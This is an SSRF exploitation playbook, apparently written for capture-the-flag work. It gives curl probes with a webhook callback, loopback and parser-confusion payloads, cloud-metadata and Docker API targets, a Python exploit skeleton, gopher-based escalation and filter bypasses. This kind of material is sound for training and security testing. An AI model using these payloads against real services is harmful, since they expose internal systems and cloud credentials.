# Web SSRF

## When to suspect this

- Features fetch URLs: webhooks, import by URL, screenshot, PDF, image proxy, link preview, avatar URL, OAuth callback, XML external refs.
- Errors mention curl, requests, fetch, socket, DNS, timeout, redirect.
- The app can reach internal services or metadata endpoints.
- URL validation allows only `http(s)` but behavior changes with redirects or alternate IP forms.

## Fast triage checklist

- Prove outbound callback first.
- Test loopback and internal hostnames.
- Test redirects.
- Test DNS rebinding only if simple redirects fail.
- Check scheme allowlist: `http`, `https`, `file`, `gopher`, `dict`.
- Check response reflection vs blind timing.
- Map internal ports if allowed.
- Look for cloud metadata, Docker API, admin panels, Redis, MySQL, SMTP.

## Manual confirmation

```bash
CALLBACK='https://webhook.site/ID'
curl -sk -X POST 'http://HOST/fetch' -d "url=$CALLBACK"
curl -sk -X POST 'http://HOST/fetch' -d 'url=http://127.0.0.1/'
curl -sk -X POST 'http://HOST/fetch' -d 'url=http://[::1]/'
curl -sk -X POST 'http://HOST/fetch' -d 'url=http://2130706433/'
```

Positive signal:

- Callback hits your listener.
- Internal response is reflected.
- Different timing/status for internal ports.
- Error reveals internal DNS or connection refused.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/web/ssrf_probe.py](../scripts/web/ssrf_probe.py) | Probe URL parameter and loopback variants | `python3 scripts/web/ssrf_probe.py --url 'http://HOST/fetch?url=INJECT'` | Status/length differences |
| `webhook.site` | Prove outbound requests | Submit webhook URL | Callback received |
| `curl` | Manual single probes | `curl -d 'url=http://127.0.0.1:8080'` | Internal response/delta |
| Burp Collaborator/interactsh | Blind DNS/HTTP callbacks | Payload URL to collaborator | DNS/HTTP interaction |

## Payload starter pack

Loopback:

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://127.1/
http://2130706433/
http://0177.0.0.1/
```

Parser confusion:

```text
http://evil.com@127.0.0.1/
http://127.0.0.1.evil.test/
http://127.0.0.1#@evil.com/
http://127.0.0.1%2f%2e%2e/
```

Internal targets:

```text
http://127.0.0.1:80/
http://127.0.0.1:5000/
http://127.0.0.1:6379/
http://169.254.169.254/latest/meta-data/
http://docker:2375/containers/json
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests, urllib.parse

URL = "http://HOST/fetch?url=INJECT"
COOKIE = {"session": "COOKIE"}

targets = [
    "http://127.0.0.1/",
    "http://127.0.0.1:5000/",
    "http://localhost/admin",
    "http://169.254.169.254/latest/meta-data/",
]

for t in targets:
    r = requests.get(URL.replace("INJECT", urllib.parse.quote(t, safe=":/?&=#")), cookies=COOKIE, timeout=8)
    print(f"{t} -> {r.status_code} len={len(r.text)}")
    print(r.text[:300].replace("\n", " "))
```

## Escalation path

- If reflected, enumerate internal routes and retrieve flag/admin data.
- If blind, use timing/port scan or DNS/HTTP callback exfil.
- If redirects are followed, host redirect to blocked target.
- If non-HTTP schemes are allowed, use `gopher://` for Redis/MySQL/SMTP style payloads.
- If Docker API is exposed, exploit only through SSRF-reachable API, not host Docker shortcuts.

## Common bypasses

- Decimal/octal/short IPs.
- IPv6 loopback.
- Userinfo `@` confusion.
- Redirects from allowed domain.
- DNS rebinding.
- Mixed slash/backslash and multiple slashes.
- Null byte or fragment confusion.
- `gopher://` no-host variants.

## Rabbit holes

- Port scanning huge ranges before proving reflection/callback.
- Assuming blocked `127.0.0.1` means all loopback forms are blocked.
- Ignoring redirects.
- Attacking cloud metadata when challenge is local Docker.
- Using local Docker management instead of SSRF path.

## Final solve checklist

- Outbound fetch behavior is proven.
- You know reflected vs blind SSRF.
- Internal target and route are identified.
- Final action uses the SSRF primitive only.

